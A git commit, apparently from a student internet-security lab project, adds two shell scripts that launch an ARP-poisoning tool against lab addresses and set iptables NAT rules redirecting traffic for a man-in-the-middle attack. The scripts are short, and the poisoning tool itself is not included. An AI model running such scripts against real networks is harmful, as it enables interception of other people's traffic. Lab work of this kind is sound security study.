e1dd3b31060c15db3520860ad9e2a0307952d280
josura <giorgiolocicero@hotmail.com>
2020-06-19 06:37:04 -0400

    all-attacks-scenarios

---
+++ internet_security/progetto_IS/attack_arp.sh
@@ -0,0 +1,1 @@
+sudo arp_poisoning/./arp_poisoning 192.168.0.4 123.123.1.1 eth1 
---
+++ internet_security/progetto_IS/start_full_attack.sh
@@ -0,0 +1,10 @@
+sudo arp_poisoning/./arp_poisoning 192.168.0.4 123.123.1.1 eth1 
+#sudo iptables -t nat -A POSTROUTING --destination 192.168.0.3/24 -j SNAT --to-source 192.168.0.4
+#sudo iptables -t nat -A OUTPUT -d  192.168.0.4/24 -j DNAT --to-destination 127.0.0.1 
+#sudo iptables -A FORWARD -i eth1 --source 123.123.1.4/24 -o 192.168.0.4 -m state --state RELATED,ESTABLISHED -j ACCEPT
+#sudo iptables -A FORWARD -i eth1 --source 123.123.1.4/24 -o 192.168.0.4 -j ACCEPT
+
+#sudo iptables -t nat -A PREROUTING -i eth1 -d --destination 192.168.0.4/24 -j SNAT
+sudo iptables -t nat -A POSTROUTING --destination 192.168.0.0/24 -o eth1 -j SNAT --to 192.168.0.4
+sudo iptables -t nat -A PREROUTING --source 192.168.0.0/24 -j DNAT --to 123.123.1.4
+
